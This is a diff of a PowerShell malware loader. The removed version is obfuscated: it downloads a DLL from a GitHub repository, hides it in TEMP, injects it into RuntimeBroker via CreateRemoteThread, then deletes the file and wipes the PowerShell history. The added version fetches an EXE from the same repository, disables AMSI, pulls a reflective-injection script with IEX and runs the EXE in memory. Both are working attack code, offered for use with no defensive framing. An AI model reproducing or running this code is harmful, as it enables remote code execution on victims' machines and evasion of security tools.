@@ -1,93 +1,45 @@
-$ErrorActionPreference = @("St","op") -join ""
+# ===============================================
+# Run Native EXE (C/C++) from URL in Memory
+# Full Reflective PE Injection - Ready to Use
+# ===============================================
 
-$_0x91A = @(
-    "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.dll"
-) -join ""
+$Url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"   # ← Change this only
+$Arguments = ""                                 # Optional: e.g. "-silent /nogui"
 
-Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
+Write-Host "[+] Downloading EXE from URL..." -ForegroundColor Cyan
 
-# ---- Download DLL ----
-$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
-$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))
-$_0x5F9 = $_0x7C1.DownloadData($_0x91A)
-
-$_0xDLLPath = "$env:TEMP\~tmp$(Get-Random).tmp"
-[System.IO.File]::WriteAllBytes($_0xDLLPath, $_0x5F9)
-(Get-Item $_0xDLLPath).Attributes = "Hidden,System"
-
-# ---- Find or Start RuntimeBroker ----
-$_0xProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
-
-if (-not $_0xProc) {
-    Start-Process "RuntimeBroker.exe"
-    Start-Sleep -Milliseconds 1200
-    $_0xProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+try {
+    $WebClient = New-Object System.Net.WebClient
+    $WebClient.Headers.Add("User-Agent", "Mozilla/5.0")
+    $PEBytes = $WebClient.DownloadData($Url)
+    Write-Host "[+] Downloaded $($PEBytes.Length) bytes" -ForegroundColor Green
+} catch {
+    Write-Host "[-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
+    exit
 }
 
-if (-not $_0xProc) { throw "Cannot start RuntimeBroker" }
+# AMSI Bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-$_0xPID = $_0xProc.Id
+# Load Reflective PE Loader (supports Native C/C++ EXE)
+Write-Host "[+] Loading Reflective PE Injection..." -ForegroundColor Yellow
 
-# ---- kernel32 Inject Signatures ----
-$_0xSig = @"
-using System;
-using System.Runtime.InteropServices;
-
-public class K32Inject {
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, int dwPID);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr lpAddr, uint dwSize, uint flAlloc, uint flProtect);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr lpBase, byte[] lpBuf, uint nSize, out int lpWritten);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr GetProcAddress(IntPtr hMod, string lpProcName);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr GetModuleHandle(string lpModName);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr lpAttr, uint dwStack, IntPtr lpStart, IntPtr lpParam, uint dwFlags, out int lpTID);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool CloseHandle(IntPtr hObj);
+try {
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1')
+} catch {
+    Write-Host "[-] Failed to load Reflective Loader. Run as Administrator." -ForegroundColor Red
+    exit
 }
-"@
 
-Add-Type -TypeDefinition $_0xSig -Language CSharp
+Write-Host "[+] Injecting and running EXE in memory..." -ForegroundColor Green
 
-# ---- Inject ----
-$_0xPATHb  = [System.Text.Encoding]::Default.GetBytes($_0xDLLPath + "`0")
-
-$_0xACCESS  = [uint32]0x1F0FFF
-$_0xMEM_COM = [uint32]0x3000
-$_0xPAGE_RW = [uint32]0x40
-
-$_0xHProc = [K32Inject]::OpenProcess($_0xACCESS, $false, $_0xPID)
-if ($_0xHProc -eq [IntPtr]::Zero) { throw "OpenProcess failed (PID=$_0xPID)" }
-
-$_0xAllocAddr = [K32Inject]::VirtualAllocEx($_0xHProc, [IntPtr]::Zero, [uint32]$_0xPATHb.Length, $_0xMEM_COM, $_0xPAGE_RW)
-if ($_0xAllocAddr -eq [IntPtr]::Zero) { throw "VirtualAllocEx failed" }
-
-$_0xWritten = 0
-$_0xOK = [K32Inject]::WriteProcessMemory($_0xHProc, $_0xAllocAddr, $_0xPATHb, [uint32]$_0xPATHb.Length, [ref]$_0xWritten)
-if (-not $_0xOK) { throw "WriteProcessMemory failed" }
-
-$_0xK32  = [K32Inject]::GetModuleHandle("kernel32.dll")
-$_0xLLAd = [K32Inject]::GetProcAddress($_0xK32, "LoadLibraryA")
-
-$_0xTID = 0
-$_0xHThread = [K32Inject]::CreateRemoteThread($_0xHProc, [IntPtr]::Zero, 0, $_0xLLAd, $_0xAllocAddr, 0, [ref]$_0xTID)
-if ($_0xHThread -eq [IntPtr]::Zero) { throw "CreateRemoteThread failed" }
-
-[K32Inject]::CloseHandle($_0xHThread) | Out-Null
-[K32Inject]::CloseHandle($_0xHProc)   | Out-Null
-
-Start-Sleep -Milliseconds 800
-Remove-Item -Path $_0xDLLPath -Force -ErrorAction SilentlyContinue
-
-$_0xHist = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-if (Test-Path $_0xHist) { Clear-Content -Path $_0xHist -Force -ErrorAction SilentlyContinue }
+try {
+    if ($Arguments) {
+        Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Arguments -ForceASLR
+    } else {
+        Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
+    }
+    Write-Host "[+] Executed successfully in memory (C++ / Native supported)" -ForegroundColor Green
+} catch {
+    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
+}
